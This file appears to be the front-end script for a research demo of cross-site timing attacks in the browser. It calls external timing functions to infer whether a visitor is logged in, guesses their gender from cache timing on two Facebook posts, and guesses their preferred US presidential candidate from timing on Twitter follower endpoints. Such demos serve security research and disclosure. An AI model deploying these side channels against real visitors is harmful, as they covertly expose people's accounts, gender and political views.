window.addEventListener('load', function() {
	function loginCheck() {
		var selectEl = document.getElementById('login-select');
		var url = selectEl.value;

		var buttonEl = document.getElementById('login-button');
		buttonEl.disabled = true;
		var debugEl = document.getElementById('login-debug');
		var resultEl = document.getElementById('login-result');
		resultEl.textContent = '';
		
		function _updateStatus(status) {
			updateStatus(debugEl, startTime, status)
		}
		var hasRedirect = window.timingAttacks.hasRedirect;
		initStatus(debugEl);
		var startTime = window.performance.now();
		if (!hasRedirect.canRun()) {
			_updateStatus('ERROR: Your browser does not support this attack');
			buttonEl.disabled = false;
			return;
		}
		_updateStatus('Attack initiated');
		hasRedirect(url, _updateStatus).then(function(redirectResult) {
			if (redirectResult) {
				resultEl.textContent = 'NOT LOGGED IN';
			}
			else {
				resultEl.textContent = 'LOGGED IN';
			}
			buttonEl.disabled = false;
		}).catch(function(errMsg) {
			buttonEl.disabled = false;
			_updateStatus('ERROR: ' + errMsg);
		});
	}

	function fbGender() {
		var buttonEl = document.getElementById('fb-gender-button');
		buttonEl.disabled = true;
		var resultEl = document.getElementById('fb-gender-result');
		resultEl.textContent = '';
		var debugEl = document.getElementById('fb-gender-debug');
		var cacheStorageAttack = window.timingAttacks.cacheStorage;

		var maleUrl = 'https://www.facebook.com/labs.tom.vg/posts/135036256933426';
		var femaleUrl = 'https://www.facebook.com/labs.tom.vg/posts/135040183599700';

		initStatus(debugEl);
		var startTime = window.performance.now();

		function _updateStatus(status) {
			updateStatus(debugEl, startTime, status)
		}
		if (!cacheStorageAttack.canRun()) {
			_updateStatus('ERROR: Your browser does not support this attack');
			return;
		}
		_updateStatus('Attack initiated, obtaining measurements for first resource');
		cacheStorageAttack(maleUrl, _updateStatus).then(function(maleResult) {
			_updateStatus('Obtaining measurements for second resource');
			cacheStorageAttack(femaleUrl, _updateStatus).then(function(femaleResult) {
				_updateStatus('Male median: ' + maleResult + ', female median: ' + femaleResult);
				var gender = maleResult > femaleResult ? 'male' : 'female';
				_updateStatus('Found target to be ' + gender.toUpperCase());
				resultEl.textContent = 'You are probably ' + gender.toUpperCase();
				buttonEl.disabled = false;
			});
		}).catch(function(errMsg) {
			buttonEl.disabled = false;
			_updateStatus('ERROR: ' + errMsg);
		});
	}

	function twitterCandidate() {
		var buttonEl = document.getElementById('twitter-candidate-button');
		buttonEl.disabled = true;
		var resultEl = document.getElementById('twitter-candidate-result');
		resultEl.textContent = '';
		var debugEl = document.getElementById('twitter-candidate-debug');
		var videoParsingAttack = window.timingAttacks.videoParsing;
		var cacheStorageAttack = window.timingAttacks.cacheStorage;

		var attackToUse = videoParsingAttack.canRun() ? videoParsingAttack : cacheStorageAttack;

		var trumpUrl = 'https://twitter.com/realDonaldTrump/followers_you_follow/users?include_available_features=1&include_entities=1&max_position=9999999999999999&reset_error_state=false';
		var hillaryUrl = 'https://twitter.com/HillaryClinton/followers_you_follow/users?include_available_features=1&include_entities=1&max_position=9999999999999999&reset_error_state=false';

		initStatus(debugEl);
		var startTime = window.performance.now();

		function _updateStatus(status) {
			updateStatus(debugEl, startTime, status)
		}

		_updateStatus('Attack initiated, obtaining measurements for Hillary Clinton');
		attackToUse(hillaryUrl, _updateStatus).then(function(hillaryResult) {
			_updateStatus('Obtaining measurements for Donald Trump');
			attackToUse(trumpUrl, _updateStatus).then(function(donaldResult) {
				_updateStatus('Hillary median: ' + hillaryResult + ', Donald median: ' + donaldResult);
				var favCandidate = hillaryResult > donaldResult ? 'Hillary Clinton' : 'Donald Trump';
				_updateStatus('Found favorite candidate to be ' + favCandidate);
				resultEl.textContent = 'The next president of the US: ' + favCandidate;
				buttonEl.disabled = false;
			});
		}).catch(function(errMsg) {
			buttonEl.disabled = false;
			_updateStatus('ERROR: ' + errMsg);
		});
	}

	function initStatus(el) {
		el.textContent = 'DEBUG\n' +
						 '---------------------------------------------------------------\n';
	}

	function updateStatus(el, startTime, status) {
		var elapsed = (window.performance.now() - startTime).toFixed(2);
		el.textContent = el.textContent + elapsed + 's: ' + status + '\n';
	}

	document.getElementById('login-button').addEventListener('click', loginCheck);
	document.getElementById('fb-gender-button').addEventListener('click', fbGender);
	document.getElementById('twitter-candidate').addEventListener('click', twitterCandidate);
});